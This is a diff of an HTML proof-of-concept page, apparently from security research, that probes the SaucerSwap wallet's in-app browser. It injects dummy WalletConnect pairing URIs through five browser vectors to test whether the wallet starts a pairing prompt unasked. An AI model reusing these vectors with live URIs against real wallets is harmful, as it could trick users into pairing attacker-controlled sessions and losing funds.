@@ -1,89 +1,99 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PoC — Parent (Trusted) Page</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>wc-uri-poc</title>
 <style>
-  body { font-family: -apple-system, system-ui, sans-serif; background:#0b0f14; color:#e6edf3; padding:20px; line-height:1.5; }
-  h1 { font-size:18px; }
-  .card { background:#161b22; border:1px solid #30363d; border-radius:8px; padding:16px; margin-bottom:16px; }
-  button, a.btn { display:inline-block; background:#238636; color:white; border:none; padding:10px 16px; border-radius:6px; font-size:14px; text-decoration:none; margin:6px 6px 0 0; cursor:pointer; }
-  a.btn.blank { background:#8957e5; }
-  #log { background:#010409; border:1px solid #30363d; border-radius:6px; padding:10px; font-family:monospace; font-size:12px; white-space:pre-wrap; min-height:80px; }
-  .warn { color:#f0883e; }
+  body { font-family: -apple-system, monospace; background:#111; color:#eee; padding:16px; }
+  button { display:block; width:100%; padding:14px; margin:8px 0; font-size:14px; background:#222; color:#0f0; border:1px solid #444; }
+  #log { white-space:pre-wrap; font-size:11px; background:#000; padding:10px; border:1px solid #333; min-height:120px; margin-top:12px; word-break:break-all; }
+  .uri { color:#0af; }
 </style>
 </head>
 <body>
+<h3>wc: URI harvester test</h3>
+<div id="log">waiting...\n</div>
 
-<h1>Step 1 — Parent context (load this in the SaucerSwap in-app browser)</h1>
-
-<div class="card">
-  <p>This page simulates the "already-connected legitimate dApp" tab. Load it inside SaucerSwap's in-app
-  browser first — <strong>connect the wallet normally here</strong> so this origin is genuinely trusted,
-  then use the buttons below to spawn a popup.</p>
-
-  <button onclick="openPopup()">window.open() popup</button>
-  <a class="btn blank" href="popup.html" target="_blank" rel="noopener">target=&quot;_blank&quot; link</a>
-  <button onclick="probeParent()">Probe wallet bridge (parent, for baseline)</button>
-
-  <p class="warn" id="verdict"></p>
-</div>
-
-<div class="card">
-  <div id="log">Waiting...</div>
-</div>
+<button onclick="run('setattr')">1. setAttribute vector</button>
+<button onclick="run('poller')">2. DOM poller vector (qrcode tag)</button>
+<button onclick="run('open')">3. window.open vector</button>
+<button onclick="run('clip')">4. clipboard.writeText vector</button>
+<button onclick="run('anchor')">5. anchor click vector</button>
 
 <script>
-function log(msg) {
-  const el = document.getElementById('log');
-  const line = `[${new Date().toISOString()}] ${msg}`;
-  el.textContent += (el.textContent === 'Waiting...' ? '' : '\n') + line;
-  console.log(line);
+var logEl = document.getElementById('log');
+function log(m) {
+  logEl.textContent += m + '\n';
+  logEl.scrollTop = logEl.scrollHeight;
 }
 
-function openPopup() {
-  log('Calling window.open("popup.html", "_blank")...');
-  const w = window.open('popup.html', '_blank');
-  if (!w) {
-    log('window.open() returned null/undefined — likely blocked, no-opped, or redirected to system browser.');
-    document.getElementById('verdict').textContent =
-      'VERDICT: window.open() did not yield a script-accessible window. Check whether a native browser tab opened instead (that alone answers the "does it spawn a child WebView" question) or nothing happened at all.';
-  } else {
-    log('window.open() returned a window reference — a new browsing context was created.');
-  }
+log('bridge present: ' + (typeof window.ReactNativeWebView !== 'undefined'));
+log('saucerswapWallet present: ' + (typeof window.saucerswapWallet !== 'undefined'));
+
+// distinct dummy topic per vector so you can match which one fired if
+// native logging / mitmproxy shows the resulting postMessage or relay call
+function fakeUri(tag) {
+  var pad = tag.padEnd(8, '0').slice(0,8);
+  return 'wc:' + pad + 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@2?relay-protocol=irn&symKey=' + '1'.repeat(64);
 }
 
-// Enumerate whatever injected wallet bridge exists, without assuming a name.
-// SaucerSwap Wallet / HashPack-style injections commonly show up as window.hashconnect,
-// window.hedera, window.saucerswap, window.ethereum-style shims, or a postMessage-based bridge.
-function enumerateBridgeCandidates() {
-  const suspects = [];
-  for (const key of Object.getOwnPropertyNames(window)) {
-    if (/hedera|hashpack|hashconnect|saucer|wallet|dapp|bridge|provider/i.test(key)) {
-      suspects.push(key);
+function run(vector) {
+  var uri = fakeUri(vector);
+  log('--- triggering [' + vector + '] ---');
+  log('<span class="uri">' + uri + '</span>');
+
+  try {
+    if (vector === 'setattr') {
+      var el = document.createElement('div');
+      document.body.appendChild(el);
+      el.setAttribute('data-uri', uri);
+      log('setAttribute called on a plain <div>, no walletconnect class/id needed');
     }
-  }
-  return suspects;
-}
 
-function probeParent() {
-  const suspects = enumerateBridgeCandidates();
-  log('Injected globals matching wallet/bridge patterns: ' + (suspects.length ? suspects.join(', ') : 'NONE FOUND'));
-  suspects.forEach(key => {
-    try {
-      log(`window.${key} = ` + JSON.stringify(window[key], (k, v) => typeof v === 'function' ? '[function]' : v).slice(0, 400));
-    } catch (e) {
-      log(`window.${key} present but not JSON-serializable (${e.message})`);
+    else if (vector === 'poller') {
+      // mimic real WC modal shape so the poller's searchForWcUri finds it:
+      // outer container needs class/id matching *walletconnect*, inner
+      // element needs tag containing "qrcode" (or w3m-qr-code/wcm-qrcode)
+      // exposing uri via getAttribute('uri')/('data-uri')/.uri/.value
+      var outer = document.createElement('div');
+      outer.className = 'walletconnect-fake-modal';
+      var inner = document.createElement('div');
+      inner.setAttribute('data-tag', 'fake-qrcode-holder');
+      // fake custom element name containing "qrcode" so tagName check matches
+      var qr = document.createElement('fake-wcm-qrcode');
+      qr.setAttribute('uri', uri);
+      inner.appendChild(qr);
+      outer.appendChild(inner);
+      document.body.appendChild(outer);
+      log('injected fake w3m/wcm-style modal, waiting up to 500ms for poller...');
     }
-  });
-}
 
-window.addEventListener('load', () => {
-  log('Parent page loaded at origin: ' + location.origin);
-  probeParent();
-});
+    else if (vector === 'open') {
+      var ret = window.open(uri);
+      log('window.open returned: ' + ret);
+    }
+
+    else if (vector === 'clip') {
+      navigator.clipboard.writeText(uri)
+        .then(function(){ log('clipboard.writeText resolved'); })
+        .catch(function(e){ log('clipboard.writeText rejected: ' + e); });
+    }
+
+    else if (vector === 'anchor') {
+      var a = document.createElement('a');
+      a.href = uri;
+      a.style.display = 'none';
+      document.body.appendChild(a);
+      a.click();
+      log('synthetic anchor click dispatched');
+    }
+  } catch (e) {
+    log('ERROR: ' + e);
+  }
+
+  log('watch native side (mitmproxy / wallet UI) for a pairing prompt or postMessage with this URI');
+}
 </script>
-
 </body>
 </html>
